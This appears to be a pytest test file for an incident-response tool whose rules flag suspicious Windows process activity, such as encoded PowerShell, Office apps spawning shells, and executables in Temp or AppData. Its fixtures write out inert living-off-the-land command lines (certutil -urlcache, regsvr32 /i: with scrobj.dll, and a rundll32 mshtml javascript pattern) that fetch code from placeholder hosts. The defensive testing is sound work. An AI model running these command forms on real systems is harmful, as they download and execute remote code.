"""Contract tests for deterministic process findings over inert evidence."""

from dataclasses import FrozenInstanceError
from datetime import UTC, datetime
from uuid import UUID, uuid5

import pytest

from irsnapshot.analyzers.process_tree import build_process_tree
from irsnapshot.models import (
    EvidenceItem,
    KnownPath,
    PathContext,
    ProcessArtifact,
    SystemSnapshot,
)
from irsnapshot.severity import Severity


def _snapshot(snapshot_data, processes, *, known_paths=()) -> SystemSnapshot:
    data = dict(snapshot_data)
    data["processes"] = [item.model_dump(mode="json") for item in processes]
    data["path_context"] = PathContext(known_paths=list(known_paths)).model_dump(
        mode="json"
    )
    for run in data["collector_runs"]:
        if run["collector"] == "processes":
            run["item_count"] = len(processes)
    return SystemSnapshot.model_validate(data)


def _context(snapshot):
    from irsnapshot.rules.base import AnalysisContext

    return AnalysisContext(
        snapshot=snapshot,
        tree=build_process_tree(snapshot.processes),
        network_links=[],
    )


def _rule(rule_id):
    from irsnapshot.rules.process_rules import PROCESS_RULES

    return next(rule for rule in PROCESS_RULES if rule.rule_id == rule_id)


def _evaluate(rule_id, snapshot):
    return _rule(rule_id).evaluate(_context(snapshot))


def _process(process_factory, pid, executable, arguments=None, **kwargs):
    return process_factory(
        pid,
        name=kwargs.pop("name", executable.rsplit("\\", 1)[-1]),
        executable=executable,
        command_line=arguments,
        username=kwargs.pop("username", r"EXAMPLE\Ana"),
        **kwargs,
    )


def _known(kind, path):
    return KnownPath(kind=kind, path=path, source="synthetic fixture")


def test_rule_base_preserves_metadata_evidence_and_deterministic_identity(
    snapshot_data, process_factory
):
    from irsnapshot.rules.base import Rule, finding_id, make_finding

    one = _process(
        process_factory,
        11,
        r"C:\Tools\one.exe",
        [r"C:\Tools\one.exe"],
    )
    two = _process(
        process_factory,
        12,
        r"C:\Tools\two.exe",
        [r"C:\Tools\two.exe"],
    )
    context = _context(_snapshot(snapshot_data, [two, one]))
    evidence = [
        EvidenceItem(
            artifact_id=two.artifact_id,
            field="executable",
            value=two.executable,
            explanation="Raw executable path.",
        ),
        EvidenceItem(
            artifact_id=one.artifact_id,
            field="pid",
            value=one.pid,
            explanation="Raw process identifier.",
        ),
    ]

    rule = None

    def evaluator(received):
        return [
            make_finding(
                received,
                rule,
                artifact_ids=[two.artifact_id, one.artifact_id, two.artifact_id],
                pids=[12, 11, 12],
                evidence=evidence,
                description="Synthetic review condition; a benign test fixture is expected.",
            )
        ]

    rule = Rule(
        rule_id="IRS-TEST",
        title="Synthetic review",
        severity=Severity.HIGH,
        evaluator=evaluator,
        mitre_technique="T0000",
    )
    finding = rule.evaluate(context)[0]
    expected_id = uuid5(
        context.snapshot.snapshot_id,
        f"IRS-TEST|{one.artifact_id},{two.artifact_id}",
    )

    assert finding.finding_id == expected_id
    assert finding_id(
        context.snapshot.snapshot_id,
        "IRS-TEST",
        [two.artifact_id, one.artifact_id, two.artifact_id],
    ) == expected_id
    assert finding.rule_id == rule.rule_id
    assert finding.title == rule.title
    assert finding.severity == Severity.HIGH
    assert finding.mitre_technique == "T0000"
    assert finding.artifact_ids == [one.artifact_id, two.artifact_id]
    assert finding.pids == [11, 12]
    assert finding.evidence == evidence
    with pytest.raises(FrozenInstanceError):
        rule.title = "changed"
    with pytest.raises(FrozenInstanceError):
        context.tree = build_process_tree([])


def test_process_rule_catalog_has_fixed_order_ids_and_severities():
    from irsnapshot.rules.process_rules import PROCESS_RULES

    assert [(rule.rule_id, rule.severity) for rule in PROCESS_RULES] == [
        ("IRS-P001", Severity.MEDIUM),
        ("IRS-P002", Severity.LOW),
        ("IRS-P003", Severity.HIGH),
        ("IRS-P004", Severity.MEDIUM),
        ("IRS-P005", Severity.HIGH),
        ("IRS-P006", Severity.MEDIUM),
        ("IRS-P007", Severity.LOW),
        ("IRS-P008", Severity.MEDIUM),
        ("IRS-P009", Severity.HIGH),
        ("IRS-P010", Severity.HIGH),
    ]


@pytest.mark.parametrize("host,option", [("powershell.exe", "-enc"), ("pwsh.exe", "-e")])
def test_p001_matches_only_parsed_encoded_command_host_options(
    snapshot_data, process_factory, host, option
):
    process = _process(process_factory, 21, host, [host, option, "opaque-data"])
    findings = _evaluate("IRS-P001", _snapshot(snapshot_data, [process]))

    assert len(findings) == 1
    assert findings[0].artifact_ids == [process.artifact_id]
    assert findings[0].pids == [21]
    assert {item.field for item in findings[0].evidence} >= {
        "executable",
        "command_line",
        "host_option",
    }
    assert "legitimate" in findings[0].description.casefold()


@pytest.mark.parametrize(
    "arguments",
    [
        ["powershell.exe", "-EncodedArguments", "opaque-data"],
        ["powershell.exe", "-Command", "Write-Output", "-enc", "data"],
        ["powershell.exe", "-enc:opaque-data"],
        ["powershell.exe", "-unknown", "-enc", "data"],
    ],
)
def test_p001_rejects_encoded_arguments_payload_and_unsupported_boundaries(
    snapshot_data, process_factory, arguments
):
    process = _process(process_factory, 22, "powershell.exe", arguments)
    assert _evaluate("IRS-P001", _snapshot(snapshot_data, [process])) == []


def test_p001_rejects_inconsistent_executable_identity(snapshot_data, process_factory):
    process = _process(
        process_factory,
        23,
        r"C:\Windows\System32\cmd.exe",
        ["powershell.exe", "-enc", "data"],
        name="powershell.exe",
    )
    assert _evaluate("IRS-P001", _snapshot(snapshot_data, [process])) == []


@pytest.mark.parametrize("option", ["-WindowStyle", "-window", "-w"])
def test_p002_matches_hidden_window_style_and_retains_value(
    snapshot_data, process_factory, option
):
    process = _process(
        process_factory,
        24,
        "pwsh.exe",
        ["pwsh.exe", option, "Hidden", "-NoProfile"],
    )
    finding = _evaluate("IRS-P002", _snapshot(snapshot_data, [process]))[0]

    option_evidence = next(
        item for item in finding.evidence if item.field == "host_option"
    )
    assert option_evidence.value == [option, "Hidden"]
    assert finding.severity == Severity.LOW


@pytest.mark.parametrize(
    "arguments",
    [
        ["powershell.exe", "-WindowStyle", "Normal"],
        ["powershell.exe", "-Command", "echo", "-WindowStyle", "Hidden"],
        ["powershell.exe", "-w"],
        ["powershell.exe", "-windowstylex", "Hidden"],
    ],
)
def test_p002_rejects_nonhidden_payload_missing_and_prefix_traps(
    snapshot_data, process_factory, arguments
):
    process = _process(process_factory, 25, "powershell.exe", arguments)
    assert _evaluate("IRS-P002", _snapshot(snapshot_data, [process])) == []


@pytest.mark.parametrize(
    "rule_id,child_name,severity",
    [
        ("IRS-P003", "powershell.exe", Severity.HIGH),
        ("IRS-P004", "cmd.exe", Severity.MEDIUM),
        ("IRS-P005", "wscript.exe", Severity.HIGH),
        ("IRS-P005", "cscript.exe", Severity.HIGH),
    ],
)
def test_office_direct_child_rules_require_a_verified_direct_link(
    snapshot_data, process_factory, rule_id, child_name, severity
):
    parent = _process(process_factory, 30, r"C:\Office\WINWORD.EXE", ["WINWORD.EXE"])
    child = _process(
        process_factory,
        31,
        rf"C:\Windows\System32\{child_name}",
        [child_name],
        ppid=30,
        created_at=datetime(2026, 9, 17, 14, 1, tzinfo=UTC),
    )
    finding = _evaluate(rule_id, _snapshot(snapshot_data, [child, parent]))[0]

    assert finding.severity == severity
    assert finding.artifact_ids == [parent.artifact_id, child.artifact_id]
    assert finding.pids == [30, 31]
    assert {item.field for item in finding.evidence} >= {
        "parent.executable",
        "parent.created_at",
        "child.executable",
        "child.created_at",
        "relationship",
    }
    assert "publisher" in finding.description.casefold()


@pytest.mark.parametrize(
    "office",
    [
        "WINWORD.EXE",
        "EXCEL.EXE",
        "POWERPNT.EXE",
        "OUTLOOK.EXE",
        "MSACCESS.EXE",
        "MSPUB.EXE",
        "ONENOTE.EXE",
    ],
)
def test_p003_accepts_the_fixed_office_basename_set(snapshot_data, process_factory, office):
    parent = _process(process_factory, 32, rf"C:\Office\{office}", [office])
    child = _process(
        process_factory,
        33,
        "powershell.exe",
        ["powershell.exe"],
        ppid=32,
        created_at=datetime(2026, 9, 17, 14, 1, tzinfo=UTC),
    )
    assert len(_evaluate("IRS-P003", _snapshot(snapshot_data, [parent, child]))) == 1


@pytest.mark.parametrize("uncertain", ["parent_time", "child_time", "newer_parent"])
def test_office_child_rules_reject_unknown_or_inconsistent_time_links(
    snapshot_data, process_factory, uncertain
):
    parent_time = datetime(2026, 9, 17, 14, tzinfo=UTC)
    child_time = datetime(2026, 9, 17, 14, 1, tzinfo=UTC)
    if uncertain == "parent_time":
        parent_time = None
    elif uncertain == "child_time":
        child_time = None
    elif uncertain == "newer_parent":
        parent_time = datetime(2026, 9, 17, 14, 2, tzinfo=UTC)
    parent = _process(
        process_factory, 34, "WINWORD.EXE", ["WINWORD.EXE"], created_at=parent_time
    )
    child = _process(
        process_factory,
        35,
        "powershell.exe",
        ["powershell.exe"],
        ppid=34,
        created_at=child_time,
    )

    assert _evaluate("IRS-P003", _snapshot(snapshot_data, [parent, child])) == []


def test_office_ancestor_and_inconsistent_parent_identity_do_not_match(
    snapshot_data, process_factory
):
    office = _process(process_factory, 36, "WINWORD.EXE", ["WINWORD.EXE"])
    intermediary = _process(
        process_factory, 37, "helper.exe", ["helper.exe"], ppid=36
    )
    shell = _process(
        process_factory, 38, "powershell.exe", ["powershell.exe"], ppid=37
    )
    disguised = _process(
        process_factory,
        39,
        r"C:\Office\notepad.exe",
        ["notepad.exe"],
        name="WINWORD.EXE",
    )
    other_shell = _process(
        process_factory, 40, "powershell.exe", ["powershell.exe"], ppid=39
    )

    snapshot = _snapshot(snapshot_data, [office, intermediary, shell, disguised, other_shell])
    assert _evaluate("IRS-P003", snapshot) == []


def test_p006_matches_only_an_executable_in_identified_temp(
    snapshot_data, process_factory
):
    process = _process(
        process_factory,
        41,
        r"C:\Users\Ana\AppData\Local\Temp\drop.exe",
        [r"C:\Users\Ana\AppData\Local\Temp\drop.exe"],
    )
    snapshot = _snapshot(
        snapshot_data,
        [process],
        known_paths=[_known("temp", r"C:\Users\Ana\AppData\Local\Temp")],
    )
    finding = _evaluate("IRS-P006", snapshot)[0]

    assert next(item for item in finding.evidence if item.field == "executable").value == process.executable
    assert "captured temp root" in next(
        item for item in finding.evidence if item.field == "path_basis"
    ).value
    assert "installer" in finding.description.casefold()


def test_p006_does_not_infer_an_executable_from_command_text_or_path_prefix(
    snapshot_data, process_factory
):
    missing = process_factory(
        42,
        name="drop.exe",
        command_line=[r"C:\Users\Ana\AppData\Local\Temp\drop.exe"],
    )
    prefix = _process(
        process_factory,
        43,
        r"C:\Users\Ana\AppData\Local\Tempest\safe.exe",
        [r"C:\Users\Ana\AppData\Local\Tempest\safe.exe"],
    )
    snapshot = _snapshot(
        snapshot_data,
        [missing, prefix],
        known_paths=[_known("temp", r"C:\Users\Ana\AppData\Local\Temp")],
    )
    assert _evaluate("IRS-P006", snapshot) == []


def test_p007_matches_appdata_but_not_temp_or_conventional_local_programs(
    snapshot_data, process_factory
):
    roaming = _process(
        process_factory,
        44,
        r"C:\Users\Ana\AppData\Roaming\drop.exe",
        [r"C:\Users\Ana\AppData\Roaming\drop.exe"],
    )
    nested_programs = _process(
        process_factory,
        45,
        r"C:\Users\Ana\AppData\Local\Other\Programs\tool.exe",
        [r"C:\Users\Ana\AppData\Local\Other\Programs\tool.exe"],
    )
    local_program = _process(
        process_factory,
        46,
        r"C:\Users\Ana\AppData\Local\Programs\Acme\app.exe",
        [r"C:\Users\Ana\AppData\Local\Programs\Acme\app.exe"],
    )
    temp = _process(
        process_factory,
        47,
        r"C:\Users\Ana\AppData\Local\Temp\installer.exe",
        [r"C:\Users\Ana\AppData\Local\Temp\installer.exe"],
    )
    paths = [
        _known("profile", r"C:\Users\Ana"),
        _known("local_appdata", r"C:\Users\Ana\AppData\Local"),
        _known("appdata", r"C:\Users\Ana\AppData\Roaming"),
        _known("temp", r"C:\Users\Ana\AppData\Local\Temp"),
    ]
    findings = _evaluate(
        "IRS-P007",
        _snapshot(snapshot_data, [local_program, temp, nested_programs, roaming], known_paths=paths),
    )

    assert [item.pids for item in findings] == [[44], [45]]
    assert all("per-user" in item.description.casefold() for item in findings)


def test_p007_requires_executable_path_evidence(snapshot_data, process_factory):
    process = process_factory(
        48,
        name="drop.exe",
        command_line=[r"C:\Users\Ana\AppData\Roaming\drop.exe"],
    )
    snapshot = _snapshot(
        snapshot_data,
        [process],
        known_paths=[_known("profile", r"C:\Users\Ana")],
    )
    assert _evaluate("IRS-P007", snapshot) == []


def test_p008_matches_certutil_urlcache_with_tokenized_http_source(
    snapshot_data, process_factory
):
    arguments = [
        "certutil.exe",
        "-urlcache",
        "-split",
        "-f",
        "https://example.invalid/inert.bin",
        r"C:\Temp\inert.bin",
    ]
    process = _process(process_factory, 50, "certutil.exe", arguments)
    finding = _evaluate("IRS-P008", _snapshot(snapshot_data, [process]))[0]

    assert next(item for item in finding.evidence if item.field == "command_line").value == arguments
    assert next(item for item in finding.evidence if item.field == "remote_source").value == arguments[4]
    assert "certificate" in finding.description.casefold()


@pytest.mark.parametrize(
    "arguments",
    [
        ["certutil.exe", "-urlcache", "file:///C:/local.cer"],
        ["certutil.exe", "-verify", "https://example.invalid/cert.cer"],
        ["certutil.exe", "-urlcache", "https://example.invalid/inert.bin"],
        [
            "certutil.exe",
            "-urlcache",
            "-f",
            "https://example.invalid/inert.bin",
            "delete",
        ],
        ["certutil.exe", "-urlcache", "source=https://example.invalid/inert.bin"],
        ["certutil.exe", "-urlcachex", "https://example.invalid/inert.bin"],
        ["certutil.exe", "-urlcache", r"C:\Temp\local.cer"],
    ],
)
def test_p008_rejects_inspection_url_free_embedded_and_prefix_traps(
    snapshot_data, process_factory, arguments
):
    process = _process(process_factory, 51, "certutil.exe", arguments)
    assert _evaluate("IRS-P008", _snapshot(snapshot_data, [process])) == []


def test_p009_matches_only_first_rundll32_argument_as_javascript_mshtml_pattern(
    snapshot_data, process_factory
):
    pattern = r'javascript:"\..\mshtml,RunHTMLApplication";/* inert synthetic marker */'
    process = _process(process_factory, 52, "rundll32.exe", ["rundll32.exe", pattern])
    finding = _evaluate("IRS-P009", _snapshot(snapshot_data, [process]))[0]

    assert next(item for item in finding.evidence if item.field == "script_pattern").value == pattern
    assert "normal dll" in finding.description.casefold()


@pytest.mark.parametrize(
    "arguments",
    [
        ["rundll32.exe", r"C:\Windows\System32\shell32.dll,Control_RunDLL"],
        [
            "rundll32.exe",
            r"C:\safe.dll,Export",
            r'javascript:"\..\mshtml,RunHTMLApplication"',
        ],
        ["rundll32.exe", r'javascript:"\..\mshtml,RunHTMLApplications"'],
        ["rundll32.exe", r"prefix-javascript:\..\mshtml,RunHTMLApplication"],
    ],
)
def test_p009_rejects_normal_later_data_and_prefix_variants(
    snapshot_data, process_factory, arguments
):
    process = _process(process_factory, 53, "rundll32.exe", arguments)
    assert _evaluate("IRS-P009", _snapshot(snapshot_data, [process])) == []


def test_p010_matches_remote_inline_i_value_with_scrobj_target(
    snapshot_data, process_factory
):
    arguments = [
        "regsvr32.exe",
        "/s",
        "/n",
        "/u",
        "/i:https://example.invalid/inert.sct",
        r"C:\Windows\System32\scrobj.dll",
    ]
    process = _process(process_factory, 54, "regsvr32.exe", arguments)
    finding = _evaluate("IRS-P010", _snapshot(snapshot_data, [process]))[0]

    assert next(item for item in finding.evidence if item.field == "remote_install_argument").value == arguments[4]
    assert next(item for item in finding.evidence if item.field == "scriptlet_target").value == arguments[5]
    assert "local component" in finding.description.casefold()


@pytest.mark.parametrize(
    "arguments",
    [
        ["regsvr32.exe", "/s", r"C:\Windows\System32\normal.dll"],
        ["regsvr32.exe", r"/i:C:\Temp\local.sct", "scrobj.dll"],
        ["regsvr32.exe", "/i:https://example.invalid/inert.sct", "normal.dll"],
        ["regsvr32.exe", "/i", "https://example.invalid/inert.sct", "scrobj.dll"],
        ["regsvr32.exe", "/ix:https://example.invalid/inert.sct", "scrobj.dll"],
        ["regsvr32.exe", "scrobj.dll", "note=https://example.invalid/inert.sct"],
    ],
)
def test_p010_rejects_local_missing_separate_prefix_and_unrelated_url_forms(
    snapshot_data, process_factory, arguments
):
    process = _process(process_factory, 55, "regsvr32.exe", arguments)
    assert _evaluate("IRS-P010", _snapshot(snapshot_data, [process])) == []


def test_rule_output_is_stable_when_process_and_path_metadata_are_reordered(
    snapshot_data, process_factory
):
    first = _process(
        process_factory,
        60,
        r"C:\Users\Ana\AppData\Roaming\one.exe",
        [r"C:\Users\Ana\AppData\Roaming\one.exe"],
    )
    second = _process(
        process_factory,
        61,
        r"C:\Users\Ana\AppData\Local\Other\two.exe",
        [r"C:\Users\Ana\AppData\Local\Other\two.exe"],
    )
    paths = [
        _known("profile", r"C:\Users\Ana"),
        _known("appdata", r"C:\Users\Ana\AppData\Roaming"),
        _known("local_appdata", r"C:\Users\Ana\AppData\Local"),
    ]
    forward = _evaluate(
        "IRS-P007", _snapshot(snapshot_data, [second, first], known_paths=paths)
    )
    reverse = _evaluate(
        "IRS-P007",
        _snapshot(snapshot_data, [first, second], known_paths=list(reversed(paths))),
    )

    assert forward == reverse
    assert [finding.artifact_ids for finding in forward] == [
        [first.artifact_id],
        [second.artifact_id],
    ]
